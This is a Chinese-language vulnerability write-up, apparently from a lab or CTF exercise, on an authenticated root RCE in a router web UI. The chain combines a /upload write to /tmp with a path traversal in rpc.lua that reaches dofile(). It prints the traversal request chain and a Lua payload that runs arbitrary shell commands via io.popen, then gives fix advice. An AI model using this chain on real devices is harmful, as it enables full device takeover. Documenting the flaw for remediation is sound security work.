# 漏洞：/upload 暂存 Lua + rpc.lua dofile 路径穿越执行

> 本报告对应 `exp/poc16_upload_tmp_rpc_dofile_lua_rce.py`。该链路不依赖写入系统插件目录：PoC 先把 Lua 模块上传到 `/tmp`，再利用 `rpc.lua` 对 `object` 的路径拼接缺陷穿越到 `/tmp` 并 `dofile()` 执行。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed（Authenticated Lua RCE → Root Command Execution） |
| **认证要求** | 需要 GL `/rpc`/`/upload` admin/root session |
| **攻击面** | `/upload` 文件写入 + `/rpc` object 路径穿越 + `dofile()` |
| **影响** | 认证后任意 Lua 代码执行；PoC 内 Lua 再通过 `io.popen(args.cmd)` 执行 root shell 命令 |
| **根因** | `/upload` 允许写 `/tmp/*`；`usr/lib/lua/oui/rpc.lua` 将 `object` 直接拼到 `/usr/lib/oui-httpd/rpc/` 前缀后 `dofile()`，无 realpath/目录约束 |
| **PoC** | `exp/poc16_upload_tmp_rpc_dofile_lua_rce.py` |

---

## 二、攻击链总览

```text
Authenticated attacker
  -> POST /upload path=/tmp/poc16_rpc.lua file=<Lua module>
  -> POST /rpc call(object="../../../../tmp/poc16_rpc.lua", method="run", args={cmd="<cmd>"})
  -> rpc.lua: script = "/usr/lib/oui-httpd/rpc/" .. object
  -> fs.access(script) == true
  -> dofile(script) 加载 /tmp/poc16_rpc.lua
  -> uploaded M.run(args) -> io.popen(args.cmd)
  -> result.output 返回命令输出
```

---

## 三、Source → Sink 分析

### 1. Source

第一阶段 Source 是 multipart 上传的 `path` 与 `file`；PoC 使用合法 `/tmp/poc16_rpc.lua`。第二阶段 Source 是 `/rpc` 的 `object` 与 `args.cmd`，其中 `object` 负责路径穿越，`cmd` 是最终 shell 命令。

### 2. Validation

`/upload` 对该 PoC 来说只要求有效 sid 和 `/tmp/` 路径。`rpc.lua` 没有禁止 `../`，也没有把 object 限制为插件基名。四个 `..` 组件才能从 `/usr/lib/oui-httpd/rpc/` 退回根目录再进入 `/tmp`。

### 3. Transform

`object="../../../../tmp/poc16_rpc.lua"` 被拼成 `/usr/lib/oui-httpd/rpc/../../../../tmp/poc16_rpc.lua`，文件系统解析后指向 `/tmp/poc16_rpc.lua`。上传的 Lua 返回 table，导出 `run(args)` 方法。

### 4. Sink

直接 sink 是 `dofile(script)` 执行攻击者控制的 Lua 文件。PoC 的 Lua 模块内部 sink 是 `io.popen(cmd)`，并把 stdout 放入 `{ output = out }` 作为 RPC 返回。

### 5. 权限边界

该链需要管理员 session，但不需要突破 `/tmp` 上传白名单；认证用户可从受限临时文件写入升级为任意 Lua 代码执行。执行上下文为设备侧 root。

---

## 四、PoC 说明

PoC 的关键实现细节：

1. multipart 中按 `path -> sid -> size -> file` 的顺序发送字段，适配 `oui-upload.lua` 的分段校验；
2. 默认上传 `/tmp/poc16_rpc.lua`；
3. 计算 object 为 `../../../../tmp/poc16_rpc.lua`；
4. 调用 `run` 方法并传入 `cmd`；
5. 直接打印 `result.output` 并扫描 flag。

---

## 五、关键证据

- `usr/lib/lua/oui/rpc.lua` 中 `script = "/usr/lib/oui-httpd/rpc/" .. object`，随后 `pcall(dofile, script)`。
- `vulnerability_traces.md` 记录 `/upload -> /tmp/<lua>` 与 `/rpc object="../../../../tmp/<name>" -> dofile()` 的完整链。
- `exp/poc16_upload_tmp_rpc_dofile_lua_rce.py` 的 `build_rpc_object_for_tmp()` 明确要求路径 normalize 后仍在 `/tmp/`。

---

## 六、rpc.lua 路径穿越源码验证

### 6.1 漏洞核心 — rpc.lua 第160行

`/usr/lib/lua/oui/rpc.lua` 的 `M.call()` 函数：

```lua
M.call = function(object, method, args)
    if not objects[object] then
        local script = "/usr/lib/oui-httpd/rpc/" .. object  -- ← 💣 路径拼接
        if not fs.access(script) then
            return glc_call(object, method, args)
        end

        local ok, tb = pcall(dofile, script)  -- ← 💣 dofile() 执行任意路径
        -- ...
    end

    local fn = objects[object] and objects[object][method]
    if not fn then
        return glc_call(object, method, args)
    end

    return fn(args)
end
```

**关键缺陷**：
1. `object` 参数直接拼接到基础路径后：`"/usr/lib/oui-httpd/rpc/" .. "../../../../tmp/poc16_rpc.lua"`
2. 结果：`/usr/lib/oui-httpd/rpc/../../../../tmp/poc16_rpc.lua` → 归一化为 `/tmp/poc16_rpc.lua`
3. `fs.access(script)` 检查路径是否可读，不检查是否在预期目录内
4. 无 `realpath()` 调用，无目录白名单，无 `../` 拒绝

### 6.2 /upload 路径约束

`/www/cgi-bin/oui-upload.lua` 允许通过认证的 session 上传文件到 `/tmp/` 目录：
- `path` 参数必须以 `/tmp/` 开头
- 文件内容无校验，可以是任意 Lua 代码

### 6.3 upload_tmp PoC 的 Lua Payload

```lua
local M = {}
function M.run(args)
    local cmd = args and args.cmd or "id"
    local f = io.popen(cmd)       -- ← 二次注入：Lua 内部执行 shell 命令
    local out = f and f:read("*a") or ""
    if f then f:close() end
    return { output = out }
end
return M
```

**双层漏洞结构**：
- **第一层**：`rpc.lua` 的路径穿越 → `dofile()` 执行攻击者上传的 Lua
- **第二层**：上传的 Lua 中使用 `io.popen(cmd)` → 执行任意 shell 命令

### 6.4 为什么需要 4 个 `../`

```
基础路径: /usr/lib/oui-httpd/rpc/
目标路径: /tmp/poc16_rpc.lua

/usr/lib/oui-httpd/rpc/ ../../../../ tmp/poc16_rpc.lua
                        ├──┘├──┘├──┘├──┘
                        │    │    │    └── /usr → /
                        │    │    └── /lib → /
                        │    └── /oui-httpd → /
                        └── /rpc → /
                                      /tmp/poc16_rpc.lua ✓
```

使用 3 个 `../` 只会到达 `/usr/tmp/` 而非 `/tmp/`。

---

## 八、双重验证确认

**Lua 源码级验证（主要方法）**：
- `rpc.lua:160` — `script = "/usr/lib/oui-httpd/rpc/" .. object` 路径拼接缺陷通过源码直接确认
- `rpc.lua:165` — `pcall(dofile, script)` 无 realpath 限制通过源码确认
- `/upload` 的 `/tmp/` 路径白名单通过 oui-upload.lua 源码确认

**二进制验证**：
- oui-httpd (nginx/Lua) 执行环境本身不需要反汇编 — Lua 源码即为最终可执行逻辑
- 上传的 Lua payload 中的 `io.popen(cmd)` 二次注入通过 rpc.lua 的 `fn(args)` 调用链确认

**关键确认**：需要 4 个 `../` 组件才能从 `/usr/lib/oui-httpd/rpc/` 穿越到 `/tmp/`，因为路径层级为：
`/usr/lib/oui-httpd/rpc/` = 4 层目录 + 1 个文件名

---

## 九、手工复核建议

建议人工确认两个修复点：一是 `object` 必须做基名白名单或 realpath 限制；二是 `/upload` 应保持路径归一化与 symlink 检查。
